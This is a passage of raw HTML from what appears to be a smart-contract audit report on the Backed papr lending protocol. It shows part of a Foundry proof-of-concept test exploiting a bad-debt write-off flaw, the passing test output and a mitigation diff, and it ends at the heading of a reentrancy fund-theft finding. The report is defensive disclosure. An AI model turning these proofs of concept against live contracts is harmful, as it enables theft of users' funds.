class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Collateral</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Collateral</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">c</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">c</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Collateral</span><span class=\"mtk1\">({</span><span class=\"mtk12\">id:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_loanMaxAndSell</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SwapParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">swapParams</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">SwapParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">minOut:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">sqrtPriceLimitX96:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_maxSqrtPriceLimit</span><span class=\"mtk1\">({</span><span class=\"mtk12\">sellingPAPR:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">}),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">swapFeeTo:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">swapFeeBips:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseDebtAndSell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">swapParams</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+}</span></span></span></code></pre>\n<p>Test output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/paprController/PoC.sol:PoC</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testPoC() (gas: 720941)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 1.21s</span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.</p>\n<p>Implementation code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">diff</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">git</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">index</span><span class=\"mtk1\"> 284</span><span class=\"mtk12\">b3f4</span><span class=\"mtk1\">..</span><span class=\"mtk12\">d7e4cea</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">--- </span><span class=\"mtk12\">a</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+++ </span><span class=\"mtk12\">b</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">61</span><span class=\"mtk1\">,</span><span class=\"mtk7\">6</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">61</span><span class=\"mtk1\">,</span><span class=\"mtk7\">8</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @dev account =&gt; asset =&gt; vaultInfo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">VaultInfo</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk3\">/// @dev account =&gt; asset =&gt; shortfall amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shortfall</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @dev does not validate args</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk3\">/// e.g. does not check whether underlying or oracleSigner are address(0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">288</span><span class=\"mtk1\">,</span><span class=\"mtk7\">6</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">290</span><span class=\"mtk1\">,</span><span class=\"mtk7\">8</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isLastCollateral</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk3\">// increase shortfall</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">_shortfall</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk3\">/// there will be debt left with no NFTs, set it to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk11\">_reduceDebtWithoutBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">408</span><span class=\"mtk1\">,</span><span class=\"mtk7\">6</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">412</span><span class=\"mtk1\">,</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">shortfall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shortfall</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk3\">/// INTERNAL NON-VIEW ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addCollateralToVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, IPaprController.Collateral </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">543</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">551</span><span class=\"mtk1\">,</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk3\">// we owe them more papr than they have in debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk3\">// so we pay down debt and send them the rest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk11\">_reduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-            </span><span class=\"mtk12\">papr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalOwed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalOwed</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">debtCached</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_shortfall</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+                </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+                </span><span class=\"mtk3\">// burn the previous shortfall</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+                </span><span class=\"mtk11\">PaprToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">papr</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+                </span><span class=\"mtk12\">_shortfall</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+                </span><span class=\"mtk12\">papr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">burnShortfall</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk3\">// reduce vault debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk11\">_reduceDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">totalOwed</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1369802651\">Jeiwan (warden) commented</a>:</strong></p>\n<blockquote>\n<p>State mismanagement causes writing off of a bad debt while there’s still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1370080925\">wilsoncusack (Backed) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Agree with @Jeiwan. The <code>isLastCollateral</code> check should also check whether there is another auction ongoing: <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-stealing-fund-by-applying-reentrancy-attack-on-removecollateral-startliquidationauction-and-purchaseliquidationauctionnft\" style=\"position:relative;\"><a href=\"#h-02-stealing-fund-by-applying-reentrancy-attack-on-removecollateral-startliquidationauction-and-purchaseliquidationauctionnft\" aria-label=\"h 02 stealing fund by applying reentrancy attack on removecollateral startliquidationauction and purchaseliquidationauctionnft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/102\">[H-02] Stealing fund by applying reentrancy attack on <code>removeCollateral</code>, <code>startLiquidationAuction</code>, and <code>purchaseLiquidationAuctionNFT</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/102\">HE1M</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/242\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/195\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/138\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/63\">Bobface</a></em></p>\n<p>By applying reentrancy attack involving the functions <code>removeCollateral</code>, <code>startLiquidationAuction</code>, and <code>purchaseLiquidationAuctionNFT</code>, an Attacker can steal large amount of funds.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 